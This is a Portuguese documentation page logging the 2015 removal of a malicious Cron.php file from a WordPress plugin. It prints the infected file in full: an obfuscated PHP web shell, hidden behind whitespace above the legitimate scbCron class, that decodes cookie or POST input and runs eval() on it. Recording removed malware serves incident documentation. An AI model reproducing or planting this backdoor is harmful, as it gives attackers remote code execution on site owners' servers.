---
id: doc12
title: Arquivos Maliciosos
sidebar_label: COD 2015-12-11:10
---

## 12.0.0 - 2015-12-11

### Fixed

- Removido arquivo Cron.php com código malicioso

## Código

```php

<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $f01fc = 538;$GLOBALS['l0efa'] = Array();global $l0efa;$l0efa = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['nbf85203'] = "\x38\x2a\x23\x55\x5c\x20\x9\x28\x65\x57\x43\x4a\x3b\x52\x27\x30\xd\x25\x7a\x62\x61\x5b\x4d\x42\x3d\x29\x3c\x7c\x71\x6b\x7e\x31\x21\xa\x79\x6a\x32\x50\x2b\x37\x41\x76\x6e\x5d\x64\x54\x69\x6f\x53\x47\x73\x36\x2e\x7d\x72\x24\x6c\x3f\x56\x66\x77\x44\x39\x35\x4b\x7b\x46\x26\x5e\x75\x58\x63\x70\x5a\x40\x22\x49\x51\x34\x59\x33\x68\x2d\x5f\x48\x78\x45\x6d\x3a\x67\x4c\x4e\x3e\x2f\x74\x2c\x60\x4f";$l0efa[$l0efa['nbf85203'][69].$l0efa['nbf85203'][59].$l0efa['nbf85203'][44].$l0efa['nbf85203'][15].$l0efa['nbf85203'][31].$l0efa['nbf85203'][19].$l0efa['nbf85203'][59]] = $l0efa['nbf85203'][71].$l0efa['nbf85203'][81].$l0efa['nbf85203'][54];$l0efa[$l0efa['nbf85203'][41].$l0efa['nbf85203'][78].$l0efa['nbf85203'][39].$l0efa['nbf85203'][39]] = $l0efa['nbf85203'][47].$l0efa['nbf85203'][54].$l0efa['nbf85203'][44];$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][19].$l0efa['nbf85203'][62].$l0efa['nbf85203'][8].$l0efa['nbf85203'][8].$l0efa['nbf85203'][80].$l0efa['nbf85203'][44].$l0efa['nbf85203'][20].$l0efa['nbf85203'][39]] = $l0efa['nbf85203'][44].$l0efa['nbf85203'][8].$l0efa['nbf85203'][59].$l0efa['nbf85203'][46].$l0efa['nbf85203'][42].$l0efa['nbf85203'][8];$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][44].$l0efa['nbf85203'][62].$l0efa['nbf85203'][0].$l0efa['nbf85203'][80].$l0efa['nbf85203'][80]] = $l0efa['nbf85203'][50].$l0efa['nbf85203'][94].$l0efa['nbf85203'][54].$l0efa['nbf85203'][56].$l0efa['nbf85203'][8].$l0efa['nbf85203'][42];$l0efa[$l0efa['nbf85203'][50].$l0efa['nbf85203'][44].$l0efa['nbf85203'][71].$l0efa['nbf85203'][51].$l0efa['nbf85203'][78].$l0efa['nbf85203'][62].$l0efa['nbf85203'][44]] = $l0efa['nbf85203'][44].$l0efa['nbf85203'][8].$l0efa['nbf85203'][59].$l0efa['nbf85203'][46].$l0efa['nbf85203'][42].$l0efa['nbf85203'][8].$l0efa['nbf85203'][44];$l0efa[$l0efa['nbf85203'][34].$l0efa['nbf85203'][44].$l0efa['nbf85203'][19].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]] = $l0efa['nbf85203'][46].$l0efa['nbf85203'][42].$l0efa['nbf85203'][46].$l0efa['nbf85203'][83].$l0efa['nbf85203'][50].$l0efa['nbf85203'][8].$l0efa['nbf85203'][94];$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][8].$l0efa['nbf85203'][78].$l0efa['nbf85203'][15].$l0efa['nbf85203'][19].$l0efa['nbf85203'][63].$l0efa['nbf85203'][36].$l0efa['nbf85203'][63].$l0efa['nbf85203'][51]] = $l0efa['nbf85203'][50].$l0efa['nbf85203'][8].$l0efa['nbf85203'][54].$l0efa['nbf85203'][46].$l0efa['nbf85203'][20].$l0efa['nbf85203'][56].$l0efa['nbf85203'][46].$l0efa['nbf85203'][18].$l0efa['nbf85203'][8];$l0efa[$l0efa['nbf85203'][72].$l0efa['nbf85203'][59].$l0efa['nbf85203'][15].$l0efa['nbf85203'][15].$l0efa['nbf85203'][63].$l0efa['nbf85203'][59].$l0efa['nbf85203'][62].$l0efa['nbf85203'][31].$l0efa['nbf85203'][51]] = $l0efa['nbf85203'][72].$l0efa['nbf85203'][81].$l0efa['nbf85203'][72].$l0efa['nbf85203'][41].$l0efa['nbf85203'][8].$l0efa['nbf85203'][54].$l0efa['nbf85203'][50].$l0efa['nbf85203'][46].$l0efa['nbf85203'][47].$l0efa['nbf85203'][42];$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][19].$l0efa['nbf85203'][80].$l0efa['nbf85203'][15].$l0efa['nbf85203'][19].$l0efa['nbf85203'][8]] = $l0efa['nbf85203'][69].$l0efa['nbf85203'][42].$l0efa['nbf85203'][50].$l0efa['nbf85203'][8].$l0efa['nbf85203'][54].$l0efa['nbf85203'][46].$l0efa['nbf85203'][20].$l0efa['nbf85203'][56].$l0efa['nbf85203'][46].$l0efa['nbf85203'][18].$l0efa['nbf85203'][8];$l0efa[$l0efa['nbf85203'][85].$l0efa['nbf85203'][36].$l0efa['nbf85203'][36].$l0efa['nbf85203'][39]] = $l0efa['nbf85203'][19].$l0efa['nbf85203'][20].$l0efa['nbf85203'][50].$l0efa['nbf85203'][8].$l0efa['nbf85203'][51].$l0efa['nbf85203'][78].$l0efa['nbf85203'][83].$l0efa['nbf85203'][44].$l0efa['nbf85203'][8].$l0efa['nbf85203'][71].$l0efa['nbf85203'][47].$l0efa['nbf85203'][44].$l0efa['nbf85203'][8];$l0efa[$l0efa['nbf85203'][81].$l0efa['nbf85203'][78].$l0efa['nbf85203'][80].$l0efa['nbf85203'][31].$l0efa['nbf85203'][44].$l0efa['nbf85203'][8]] = $l0efa['nbf85203'][50].$l0efa['nbf85203'][8].$l0efa['nbf85203'][94].$l0efa['nbf85203'][83].$l0efa['nbf85203'][94].$l0efa['nbf85203'][46].$l0efa['nbf85203'][87].$l0efa['nbf85203'][8].$l0efa['nbf85203'][83].$l0efa['nbf85203'][56].$l0efa['nbf85203'][46].$l0efa['nbf85203'][87].$l0efa['nbf85203'][46].$l0efa['nbf85203'][94];$l0efa[$l0efa['nbf85203'][94].$l0efa['nbf85203'][51].$l0efa['nbf85203'][19].$l0efa['nbf85203'][20]] = $l0efa['nbf85203'][35].$l0efa['nbf85203'][8].$l0efa['nbf85203'][39].$l0efa['nbf85203'][62];$l0efa[$l0efa['nbf85203'][56].$l0efa['nbf85203'][59].$l0efa['nbf85203'][78].$l0efa['nbf85203'][15].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]] = $l0efa['nbf85203'][19].$l0efa['nbf85203'][39].$l0efa['nbf85203'][78].$l0efa['nbf85203'][0].$l0efa['nbf85203'][19].$l0efa['nbf85203'][15].$l0efa['nbf85203'][15];$l0efa[$l0efa['nbf85203'][72].$l0efa['nbf85203'][20].$l0efa['nbf85203'][44].$l0efa['nbf85203'][39].$l0efa['nbf85203'][39].$l0efa['nbf85203'][63].$l0efa['nbf85203'][71].$l0efa['nbf85203'][31]] = $_POST;$l0efa[$l0efa['nbf85203'][60].$l0efa['nbf85203'][62].$l0efa['nbf85203'][71].$l0efa['nbf85203'][80].$l0efa['nbf85203'][39].$l0efa['nbf85203'][15]] = $_COOKIE;@$l0efa[$l0efa['nbf85203'][34].$l0efa['nbf85203'][44].$l0efa['nbf85203'][19].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]]($l0efa['nbf85203'][8].$l0efa['nbf85203'][54].$l0efa['nbf85203'][54].$l0efa['nbf85203'][47].$l0efa['nbf85203'][54].$l0efa['nbf85203'][83].$l0efa['nbf85203'][56].$l0efa['nbf85203'][47].$l0efa['nbf85203'][89], NULL);@$l0efa[$l0efa['nbf85203'][34].$l0efa['nbf85203'][44].$l0efa['nbf85203'][19].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]]($l0efa['nbf85203'][56].$l0efa['nbf85203'][47].$l0efa['nbf85203'][89].$l0efa['nbf85203'][83].$l0efa['nbf85203'][8].$l0efa['nbf85203'][54].$l0efa['nbf85203'][54].$l0efa['nbf85203'][47].$l0efa['nbf85203'][54].$l0efa['nbf85203'][50], 0);@$l0efa[$l0efa['nbf85203'][34].$l0efa['nbf85203'][44].$l0efa['nbf85203'][19].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]]($l0efa['nbf85203'][87].$l0efa['nbf85203'][20].$l0efa['nbf85203'][85].$l0efa['nbf85203'][83].$l0efa['nbf85203'][8].$l0efa['nbf85203'][85].$l0efa['nbf85203'][8].$l0efa['nbf85203'][71].$l0efa['nbf85203'][69].$l0efa['nbf85203'][94].$l0efa['nbf85203'][46].$l0efa['nbf85203'][47].$l0efa['nbf85203'][42].$l0efa['nbf85203'][83].$l0efa['nbf85203'][94].$l0efa['nbf85203'][46].$l0efa['nbf85203'][87].$l0efa['nbf85203'][8], 0);@$l0efa[$l0efa['nbf85203'][81].$l0efa['nbf85203'][78].$l0efa['nbf85203'][80].$l0efa['nbf85203'][31].$l0efa['nbf85203'][44].$l0efa['nbf85203'][8]](0);if (!$l0efa[$l0efa['nbf85203'][50].$l0efa['nbf85203'][44].$l0efa['nbf85203'][71].$l0efa['nbf85203'][51].$l0efa['nbf85203'][78].$l0efa['nbf85203'][62].$l0efa['nbf85203'][44]]($l0efa['nbf85203'][40].$l0efa['nbf85203'][90].$l0efa['nbf85203'][13].$l0efa['nbf85203'][86].$l0efa['nbf85203'][40].$l0efa['nbf85203'][61].$l0efa['nbf85203'][79].$l0efa['nbf85203'][83].$l0efa['nbf85203'][13].$l0efa['nbf85203'][3].$l0efa['nbf85203'][91].$l0efa['nbf85203'][83].$l0efa['nbf85203'][80].$l0efa['nbf85203'][51].$l0efa['nbf85203'][51].$l0efa['nbf85203'][20].$l0efa['nbf85203'][59].$l0efa['nbf85203'][19].$l0efa['nbf85203'][0].$l0efa['nbf85203'][20].$l0efa['nbf85203'][0].$l0efa['nbf85203'][20].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80].$l0efa['nbf85203'][63].$l0efa['nbf85203'][63].$l0efa['nbf85203'][20].$l0efa['nbf85203'][19].$l0efa['nbf85203'][36].$l0efa['nbf85203'][31].$l0efa['nbf85203'][59].$l0efa['nbf85203'][19].$l0efa['nbf85203'][59].$l0efa['nbf85203'][31].$l0efa['nbf85203'][31].$l0efa['nbf85203'][19].$l0efa['nbf85203'][20].$l0efa['nbf85203'][31].$l0efa['nbf85203'][20].$l0efa['nbf85203'][15].$l0efa['nbf85203'][36].$l0efa['nbf85203'][59].$l0efa['nbf85203'][19].$l0efa['nbf85203'][20])){$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][19].$l0efa['nbf85203'][62].$l0efa['nbf85203'][8].$l0efa['nbf85203'][8].$l0efa['nbf85203'][80].$l0efa['nbf85203'][44].$l0efa['nbf85203'][20].$l0efa['nbf85203'][39]]($l0efa['nbf85203'][40].$l0efa['nbf85203'][90].$l0efa['nbf85203'][13].$l0efa['nbf85203'][86].$l0efa['nbf85203'][40].$l0efa['nbf85203'][61].$l0efa['nbf85203'][79].$l0efa['nbf85203'][83].$l0efa['nbf85203'][13].$l0efa['nbf85203'][3].$l0efa['nbf85203'][91].$l0efa['nbf85203'][83].$l0efa['nbf85203'][80].$l0efa['nbf85203'][51].$l0efa['nbf85203'][51].$l0efa['nbf85203'][20].$l0efa['nbf85203'][59].$l0efa['nbf85203'][19].$l0efa['nbf85203'][0].$l0efa['nbf85203'][20].$l0efa['nbf85203'][0].$l0efa['nbf85203'][20].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80].$l0efa['nbf85203'][63].$l0efa['nbf85203'][63].$l0efa['nbf85203'][20].$l0efa['nbf85203'][19].$l0efa['nbf85203'][36].$l0efa['nbf85203'][31].$l0efa['nbf85203'][59].$l0efa['nbf85203'][19].$l0efa['nbf85203'][59].$l0efa['nbf85203'][31].$l0efa['nbf85203'][31].$l0efa['nbf85203'][19].$l0efa['nbf85203'][20].$l0efa['nbf85203'][31].$l0efa['nbf85203'][20].$l0efa['nbf85203'][15].$l0efa['nbf85203'][36].$l0efa['nbf85203'][59].$l0efa['nbf85203'][19].$l0efa['nbf85203'][20], 1);$e3362d2 = NULL;$i1ed = NULL;$l0efa[$l0efa['nbf85203'][56].$l0efa['nbf85203'][51].$l0efa['nbf85203'][51].$l0efa['nbf85203'][63].$l0efa['nbf85203'][78].$l0efa['nbf85203'][44].$l0efa['nbf85203'][51]] = $l0efa['nbf85203'][15].$l0efa['nbf85203'][59].$l0efa['nbf85203'][71].$l0efa['nbf85203'][62].$l0efa['nbf85203'][62].$l0efa['nbf85203'][20].$l0efa['nbf85203'][63].$l0efa['nbf85203'][20].$l0efa['nbf85203'][82].$l0efa['nbf85203'][15].$l0efa['nbf85203'][8].$l0efa['nbf85203'][71].$l0efa['nbf85203'][36].$l0efa['nbf85203'][82].$l0efa['nbf85203'][78].$l0efa['nbf85203'][20].$l0efa['nbf85203'][44].$l0efa['nbf85203'][20].$l0efa['nbf85203'][82].$l0efa['nbf85203'][0].$l0efa['nbf85203'][36].$l0efa['nbf85203'][78].$l0efa['nbf85203'][20].$l0efa['nbf85203'][82].$l0efa['nbf85203'][71].$l0efa['nbf85203'][62].$l0efa['nbf85203'][63].$l0efa['nbf85203'][15].$l0efa['nbf85203'][39].$l0efa['nbf85203'][44].$l0efa['nbf85203'][8].$l0efa['nbf85203'][44].$l0efa['nbf85203'][36].$l0efa['nbf85203'][19].$l0efa['nbf85203'][31].$l0efa['nbf85203'][63];global $l6654d6;function  b748b00($e3362d2, $q1ecc0d){global $l0efa;$v9db7dd = "";for ($ne04=0; $ne04<$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][44].$l0efa['nbf85203'][62].$l0efa['nbf85203'][0].$l0efa['nbf85203'][80].$l0efa['nbf85203'][80]]($e3362d2);){for ($p6543=0; $p6543<$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][44].$l0efa['nbf85203'][62].$l0efa['nbf85203'][0].$l0efa['nbf85203'][80].$l0efa['nbf85203'][80]]($q1ecc0d) && $ne04<$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][44].$l0efa['nbf85203'][62].$l0efa['nbf85203'][0].$l0efa['nbf85203'][80].$l0efa['nbf85203'][80]]($e3362d2); $p6543++, $ne04++){$v9db7dd .= $l0efa[$l0efa['nbf85203'][69].$l0efa['nbf85203'][59].$l0efa['nbf85203'][44].$l0efa['nbf85203'][15].$l0efa['nbf85203'][31].$l0efa['nbf85203'][19].$l0efa['nbf85203'][59]]($l0efa[$l0efa['nbf85203'][41].$l0efa['nbf85203'][78].$l0efa['nbf85203'][39].$l0efa['nbf85203'][39]]($e3362d2[$ne04]) ^ $l0efa[$l0efa['nbf85203'][41].$l0efa['nbf85203'][78].$l0efa['nbf85203'][39].$l0efa['nbf85203'][39]]($q1ecc0d[$p6543]));}}return $v9db7dd;}function  je79($e3362d2, $q1ecc0d){global $l0efa;global $l6654d6;return $l0efa[$l0efa['nbf85203'][56].$l0efa['nbf85203'][59].$l0efa['nbf85203'][78].$l0efa['nbf85203'][15].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]]($l0efa[$l0efa['nbf85203'][56].$l0efa['nbf85203'][59].$l0efa['nbf85203'][78].$l0efa['nbf85203'][15].$l0efa['nbf85203'][36].$l0efa['nbf85203'][80]]($e3362d2, $l6654d6), $q1ecc0d);}foreach ($l0efa[$l0efa['nbf85203'][60].$l0efa['nbf85203'][62].$l0efa['nbf85203'][71].$l0efa['nbf85203'][80].$l0efa['nbf85203'][39].$l0efa['nbf85203'][15]] as $q1ecc0d=>$sdb48){$e3362d2 = $sdb48;$i1ed = $q1ecc0d;}if (!$e3362d2){foreach ($l0efa[$l0efa['nbf85203'][72].$l0efa['nbf85203'][20].$l0efa['nbf85203'][44].$l0efa['nbf85203'][39].$l0efa['nbf85203'][39].$l0efa['nbf85203'][63].$l0efa['nbf85203'][71].$l0efa['nbf85203'][31]] as $q1ecc0d=>$sdb48){$e3362d2 = $sdb48;$i1ed = $q1ecc0d;}}$e3362d2 = @$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][19].$l0efa['nbf85203'][80].$l0efa['nbf85203'][15].$l0efa['nbf85203'][19].$l0efa['nbf85203'][8]]($l0efa[$l0efa['nbf85203'][94].$l0efa['nbf85203'][51].$l0efa['nbf85203'][19].$l0efa['nbf85203'][20]]($l0efa[$l0efa['nbf85203'][85].$l0efa['nbf85203'][36].$l0efa['nbf85203'][36].$l0efa['nbf85203'][39]]($e3362d2), $i1ed));if (isset($e3362d2[$l0efa['nbf85203'][20].$l0efa['nbf85203'][29]]) && $l6654d6==$e3362d2[$l0efa['nbf85203'][20].$l0efa['nbf85203'][29]]){if ($e3362d2[$l0efa['nbf85203'][20]] == $l0efa['nbf85203'][46]){$ne04 = Array($l0efa['nbf85203'][72].$l0efa['nbf85203'][41] => @$l0efa[$l0efa['nbf85203'][72].$l0efa['nbf85203'][59].$l0efa['nbf85203'][15].$l0efa['nbf85203'][15].$l0efa['nbf85203'][63].$l0efa['nbf85203'][59].$l0efa['nbf85203'][62].$l0efa['nbf85203'][31].$l0efa['nbf85203'][51]](),$l0efa['nbf85203'][50].$l0efa['nbf85203'][41] => $l0efa['nbf85203'][31].$l0efa['nbf85203'][52].$l0efa['nbf85203'][15].$l0efa['nbf85203'][82].$l0efa['nbf85203'][31],);echo @$l0efa[$l0efa['nbf85203'][28].$l0efa['nbf85203'][8].$l0efa['nbf85203'][78].$l0efa['nbf85203'][15].$l0efa['nbf85203'][19].$l0efa['nbf85203'][63].$l0efa['nbf85203'][36].$l0efa['nbf85203'][63].$l0efa['nbf85203'][51]]($ne04);}elseif ($e3362d2[$l0efa['nbf85203'][20]] == $l0efa['nbf85203'][8]){eval/*zd603147*/($e3362d2[$l0efa['nbf85203'][44]]);}exit();}} ?><?php
/**
 * WP Cron job container.
 */
class scbCron {
	protected $schedule;
	protected $interval;
	protected $time;

	protected $hook;
	protected $callback_args = array();

	/**
	 * Create a new cron job.
	 *
	 * @param string|bool $file (optional) Reference to main plugin file
	 * @param array       $args List of args:
	 *                          string $action OR callback $callback
	 *                          string $schedule OR number $interval
	 *                          array $callback_args (optional)
	 *
	 * @return void
	 */
	public function __construct( $file = false, $args ) {

		// Set time & schedule
		if ( isset( $args['time'] ) ) {
			$this->time = $args['time'];
		}

		if ( isset( $args['interval'] ) ) {
			$this->schedule = $args['interval'] . 'secs';
			$this->interval = $args['interval'];
		} elseif ( isset( $args['schedule'] ) ) {
			$this->schedule = $args['schedule'];
		}

		// Set hook
		if ( isset( $args['action'] ) ) {
			$this->hook = $args['action'];
		} else if ( isset( $args['callback'] ) ) {
			$this->hook = self::_callback_to_string( $args['callback'] );
			add_action( $this->hook, $args['callback'] );
		} else if ( method_exists( $this, 'callback' ) ) {
			$this->hook = self::_callback_to_string( array( $this, 'callback' ) );
			add_action( $this->hook, $args['callback'] );
		} else {
			trigger_error( '$action OR $callback not set', E_USER_WARNING );
		}

		if ( isset( $args['callback_args'] ) ) {
			$this->callback_args = (array) $args['callback_args'];
		}

		if ( $file && $this->schedule ) {
			scbUtil::add_activation_hook( $file, array( $this, 'reset' ) );
			register_deactivation_hook( $file, array( $this, 'unschedule' ) );
		}

		add_filter( 'cron_schedules', array( $this, '_add_timing' ) );
	}

	/**
	 * Change the interval of the cron job.
	 *
	 * @param array $args List of args:
	 *                    string $schedule OR number $interval
	 *                    timestamp $time ( optional )
	 *
	 * @return void
	 */
	public function reschedule( $args ) {

		if ( $args['schedule'] && $this->schedule != $args['schedule'] ) {
			$this->schedule = $args['schedule'];
		} elseif ( $args['interval'] && $this->interval != $args['interval'] ) {
			$this->schedule = $args['interval'] . 'secs';
			$this->interval = $args['interval'];
		}

		$this->time = $args['time'];

		$this->reset();
	}

	/**
	 * Reset the schedule.
	 *
	 * @return void
	 */
	public function reset() {
		$this->unschedule();
		$this->schedule();
	}

	/**
	 * Clear the cron job.
	 *
	 * @return void
	 */
	public function unschedule() {
#		wp_clear_scheduled_hook( $this->hook, $this->callback_args );
		self::really_clear_scheduled_hook( $this->hook );
	}

	/**
	 * Execute the job now.
	 *
	 * @param array $args (optional) List of arguments to pass to the callback.
	 *
	 * @return void
	 */
	public function do_now( $args = null ) {
		if ( is_null( $args ) ) {
			$args = $this->callback_args;
		}

		do_action_ref_array( $this->hook, $args );
	}

	/**
	 * Execute the job with a given delay.
	 *
	 * @param int   $delay (optional) Delay in seconds.
	 * @param array $args  (optional) List of arguments to pass to the callback.
	 *
	 * @return void
	 */
	public function do_once( $delay = 0, $args = null ) {
		if ( is_null( $args ) ) {
			$args = $this->callback_args;
		}

		wp_clear_scheduled_hook( $this->hook, $args );
		wp_schedule_single_event( time() + $delay, $this->hook, $args );
	}


//_____INTERNAL METHODS_____

	/**
	 * Adds custom schedule timing.
	 *
	 * @param array $schedules
	 *
	 * @return array
	 */
	public function _add_timing( $schedules ) {
		if ( isset( $schedules[ $this->schedule ] ) ) {
			return $schedules;
		}

		$schedules[ $this->schedule ] = array(
			'interval' => $this->interval,
			'display'  => $this->interval . ' seconds',
		);

		return $schedules;
	}

	/**
	 * Schedule the job.
	 *
	 * @return void
	 */
	protected function schedule() {
		if ( ! $this->time ) {
			$this->time = time();
		}

		wp_schedule_event( $this->time, $this->schedule, $this->hook, $this->callback_args );
	}

	/**
	 * Clears scheduled job.
	 *
	 * @param string $name
	 *
	 * @return void
	 */
	protected static function really_clear_scheduled_hook( $name ) {
		$crons = _get_cron_array();

		foreach ( $crons as $timestamp => $hooks ) {
			foreach ( $hooks as $hook => $args ) {
				if ( $hook == $name ) {
					unset( $crons[ $timestamp ][ $hook ] );
				}
			}

			if ( empty( $crons[ $timestamp ] ) ) {
				unset( $crons[ $timestamp ] );
			}
		}

		_set_cron_array( $crons );
	}

	/**
	 * Generates a hook name from given callback.
	 *
	 * @param callback $callback
	 *
	 * @return string
	 */
	protected static function _callback_to_string( $callback ) {
		if ( ! is_array( $callback ) ) {
			$str = $callback;
		} else if ( ! is_string( $callback[0] ) ) {
			$str = get_class( $callback[0] ) . '_' . $callback[1];
		} else {
			$str = $callback[0] . '::' . $callback[1];
		}

		$str .= '_hook';

		return $str;
	}
}


```
